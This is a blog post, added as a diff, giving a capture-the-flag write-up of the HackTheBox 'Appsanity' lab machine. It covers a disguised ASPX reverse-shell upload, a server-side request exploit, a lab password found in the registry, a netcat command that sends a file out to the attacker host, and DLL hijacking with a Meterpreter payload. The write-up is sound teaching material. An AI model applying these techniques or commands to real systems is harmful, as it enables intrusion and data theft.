@@ -1,0 +1,154 @@
+---
+layout: post
+title: "Appsanity b07c236213cc4a9a8f6e41d61d403a84"
+date:   2025-07-10 12:05:57 -0400
+categories: writeups
+---
+
+# Appsanity
+
+HackTheBox: Hard
+
+<aside>
+💡 A hard windows machine where we can explore a web site looking for SSFR vulneravility.
+
+</aside>
+
+## 1: Enumeration
+
+- nmap scanning
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled.png' | relative_url }})
+
+There’s just two ports opened let's see what’s going on 
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_1.png' | relative_url }})
+
+A healthcare page with a sign in interface, try sign up a use brupsuite
+
+- There are some parameters we pass away when we sign up, one of those is Acctype which is normally 1 but there’s no sanitization and we can change it to number 2 and create a doctor account.
+- Using burpsuite we catch the access_token which could help us later
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_2.png' | relative_url }})
+
+Using ffuf tool to reach subdomains i found a portal one, we add it at etc/hosts and let’s check
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_3.png' | relative_url }})
+
+A login interface, we don’t have those creds, but may trying using the token we’ve got before can be useful
+
+## 2: User flag
+
+- Once inside go to Upload report where we can send .pdf reports, the system (function upload) check the extension and the header of the file.
+
+> Additionally we use burpsuite to  see existing reports and found a ViewReports.aspx file used to read reports. So we’re gonna use a revshell.aspx to induce later a SSFR on Issue Prescription where there is a panel which enable make requests to the [localhost](http://localhost) on 8080 port.
+> 
+1. Our rev shell must have %PDF-1.3 on the first line to assure the program will recognize as a pdf.
+2. Our rev shell must have a .pdf extension.
+3. Send the payload and active the proxy to fix parameters using burpsuite
+4. Change the extension of the file from pdf to aspx → forward→ forward → forward
+
+Then we should get a success message and go yo IssuePrescription panel
+
+> Open a listening port using netcat
+> 
+
+Exploit SSFR 
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_4.png' | relative_url }})
+
+User flag on c:\Users\svc_exampanel\Desktop>type user.txt
+
+## 3: Priv esc
+
+- We found some dll’s on c:\inetpub\ExaminationPanel\ExaminationPanel\bin
+- There’s might be something interesting on ExaminationManagement.dll let’s move from here to c:\Users\svc_exampanel\Desktop because is there where we have permissions, use nc to download locally to reverse it.
+
+```bash
+nc -lnvp4444 >  ExaminationManagement.dll
+.\nc.exe 10.10.14.000 4444 -w 3 <  ExaminationManagement.dll
+
+```
+
+<aside>
+🪡 We’ll use dnSpy to reverse dll
+
+</aside>
+
+We can see there’s a key which is saved on the local machine specifically on (Software\\MedDigi)  
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_5.png' | relative_url }})
+
+```bash
+reg query HKEY_LOCAL_MACHINE\Software\MedDigi
+```
+
+- "HKEY_LOCAL_MACHINE" is one of the five main sections of the Windows registry. It contains settings specific to the current computer, regardless of the user logged in.
+- "Software" is a subsection within HKEY_LOCAL_MACHINE that contains information about installed software on the system.
+- "MedDigi" appears to be a specific key within the "Software" subsection.
+
+### Password: 1g0tTh3R3m3dy\!\!
+
+\ To indicate a special character
+
+Check for evil winrm port (5985) to see if we can get access
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_6.png' | relative_url }})
+
+We have these users
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_7.png' | relative_url }})
+
+So
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_8.png' | relative_url }})
+
+Download linpeas and see what’s going on
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_9.png' | relative_url }})
+
+There’s a service running locally
+
+Revese ReportManagement.exe and check  using search ‘upload’  and f5 to decompile
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_10.png' | relative_url }})
+
+We found what is the dll’s route and a dll called externalupload which we can not find on existing dll’s, it is call from somewhere
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_11.png' | relative_url }})
+
+icacls to check premises and we have write permissions, so we can make a beautiful dll hijacking
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_12.png' | relative_url }})
+
+---
+
+> Once we finalize recognition let’s exploit the vulnerability and  escalate privileges
+> 
+1. We are gonna make the evil dll using msfvenom tool, we use -p to specify payload type(Meterpeter). Our local host will be a network interface (tun0) which will receive the reverse connection -f says the outgoing format
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_13.png' | relative_url }})
+
+1. We are going to listen using metasploit. We use this tool because it help us to get connections from multiple kinds of payloads made by using MSFVenom with multi/handler
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_14.png' | relative_url }})
+
+1. Upload the dll
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_15.png' | relative_url }})
+
+1. Start a port forwarding to execute commands in a service running locally
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_16.png' | relative_url }})
+
+1. Establishing port forwarding.
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_17.png' | relative_url }})
+
+Use net cat to run the service and upload our malicious dll
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_18.png' | relative_url }})
+
+Machine pwned!!
+
+![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_19.png' | relative_url }})
